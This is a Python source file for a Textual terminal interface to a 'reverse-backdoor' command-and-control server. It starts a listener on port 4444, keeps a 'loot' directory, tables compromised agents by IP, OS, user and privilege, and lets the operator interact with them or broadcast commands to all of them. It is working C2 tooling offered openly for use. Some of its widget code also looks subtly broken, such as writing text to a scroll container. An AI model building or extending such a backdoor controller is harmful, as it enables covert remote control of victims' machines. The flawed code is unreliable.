"""Terminal UI for reverse-backdoor C2 via Textual."""

import os
import threading

from textual.app import App, ComposeResult
from textual.containers import Container, Horizontal, VerticalScroll
from textual.widgets import Header, Footer, Input, DataTable
from textual.binding import Binding
from textual.reactive import reactive

from server.core.agent_registry import AgentRegistry
from common.logging import get_logger


class TuiApp:
    def run(self, loot_dir='loot', listener_host='0.0.0.0', listener_port=4444,
            tls=False, encryption=False):
        try:
            from textual.app import App
        except ImportError:
            print("Textual not installed. Install with: pip install textual")
            return

        logger = get_logger()
        log_dir = os.path.join(loot_dir, 'logs')
        logger.set_agent_log_dir(log_dir)
        logger.add_file_handler(os.path.join(log_dir, 'server.log'))

        app = ReverseBackdoorApp(loot_dir, listener_host, listener_port, tls, encryption)
        app.run()


_tui_registry = AgentRegistry()


class ReverseBackdoorApp(App):
    CSS = """
    Screen {
        layout: grid;
        grid-size: 4 3;
        grid-rows: 1fr 10fr 1fr;
    }
    #sidebar {
        column-span: 1;
        row-span: 2;
        border: solid $primary;
        background: $surface;
    }
    #output {
        column-span: 3;
        row-span: 1;
        border: solid $primary;
        background: $surface;
        overflow-y: auto;
    }
    #cmd-bar {
        column-span: 4;
        row-span: 1;
        dock: bottom;
    }
    #cmd-input {
        dock: bottom;
    }
    #agent-table {
        height: 100%;
    }
    .status-online {
        color: green;
    }
    .status-offline {
        color: red;
    }
    """

    BINDINGS = [
        Binding("q", "quit", "Quit"),
        Binding("r", "refresh", "Refresh"),
        Binding("l", "toggle_log", "Log"),
        Binding("?", "show_help", "Help"),
    ]

    def __init__(self, loot_dir, host, port, tls, encryption):
        super().__init__()
        self._loot_dir = loot_dir
        self._host = host
        self._port = port
        self._tls = tls
        self._encryption = encryption
        self._show_log = reactive(True)

    def compose(self) -> ComposeResult:
        yield Header()
        with Horizontal(id="sidebar"):
            yield DataTable(id="agent-table", cursor_type="row")
        yield VerticalScroll(id="output")
        with Container(id="cmd-bar"):
            yield Input(placeholder="REVERSE_BACKDOOR> ", id="cmd-input")
        yield Footer()

    def on_mount(self):
        table = self.query_one("#agent-table", DataTable)
        table.add_columns("ID", "IP", "OS", "User", "Priv")
        table.focus()

        self.set_interval(2, self._refresh_agents)

        log = self.query_one("#output", VerticalScroll)
        log.border_title = "REVERSE_BACKDOOR C2"
        log.write("[cyan]TUI started[/cyan]")
        log.write(f"[dim]Listener: {self._host}:{self._port}[/dim]")

        from server.core.listener import start_listener
        from server.core.session import run_session

        def session_cb(target, ip, enc):
            run_session(target, ip, self._loot_dir, enc)

        threading.Thread(
            target=start_listener,
            args=(self._host, self._port, session_cb, self._encryption, self._tls),
            daemon=True,
        ).start()
        log.write(f"[green]Listener started on {self._host}:{self._port}[/green]")

    def action_refresh(self):
        self._refresh_agents()

    def action_toggle_log(self):
        self._show_log = not self._show_log
        log = self.query_one("#output", VerticalScroll)
        log.write(f"[dim]Log pane: {'visible' if self._show_log else 'hidden'}[/dim]")

    def action_show_help(self):
        log = self.query_one("#output", VerticalScroll)
        log.write("[bold]Commands:[/bold]")
        log.write("  [cyan]agents[/cyan] - refresh agent list")
        log.write("  [cyan]interact <id>[/cyan] - interact with agent")
        log.write("  [cyan]broadcast <cmd>[/cyan] - send command to all")
        log.write("  [cyan]logs [id] [n][/cyan] - view command logs")
        log.write("  [cyan]help / exit[/cyan]")

    def _refresh_agents(self):
        table = self.query_one("#agent-table", DataTable)
        table.clear()
        agents = _tui_registry.list_all()
        for aid, info in agents.items():
            table.add_row(
                f"[cyan]{info.agent_id}[/cyan]",
                info.ip,
                info.os or "?",
                info.user or "?",
                info.privilege or "?",
            )

    def on_input_submitted(self, event: Input.Submitted):
        command = event.value.strip()
        if not command:
            return
        event.input.value = ""
        log = self.query_one("#output", VerticalScroll)

        if command == "agents":
            self._refresh_agents()

        elif command == "help":
            self.action_show_help()

        elif command in ("exit", "quit"):
            log.write("[yellow]Shutting down...[/yellow]")
            self.exit()

        elif command.startswith("interact "):
            target_id = command[9:].strip()
            info = _tui_registry.get(target_id)
            if info is None:
                log.write(f"[red]Agent '{target_id}' not found[/red]")
            else:
                log.write(f"[green]Interacting with {target_id}[/green]")
                log.write(f"[dim]  IP: {info.ip}[/dim]")

        elif command.startswith("broadcast "):
            cmd = command[10:].strip()
            _tui_registry.broadcast(cmd)
            log.write(f"[green]Broadcast sent: {cmd}[/green]")

        elif command.startswith("logs"):
            args = command[4:].strip()
            logger = get_logger()
            if not args:
                summary = logger.command_summary()
                if summary:
                    log.write("[bold]Command Summary[/bold]")
                    for aid, s in summary.items():
                        log.write(f"  {aid}: {s['total']} cmds, {s['ok']} ok, {s['error']} errors, {s['unique_commands']} unique")
                else:
                    log.write("[dim]No commands logged yet[/dim]")
            else:
                parts = args.split()
                n = int(parts[1]) if len(parts) > 1 else 20
                entries = logger.get_recent_commands(parts[0], n)
                if not entries:
                    log.write(f"[dim]No logs for {parts[0]}[/dim]")
                else:
                    for e in entries:
                        color = "green" if e.status == "ok" else "red"
                        log.write(f"[dim]{e.timestamp.strftime('%H:%M:%S')}[/dim] [{color}]{e.command}[/{color}] ({e.response_size}b, {e.duration_ms}ms)")

        else:
            log.write(f"[red]Unknown: {command}[/red]")
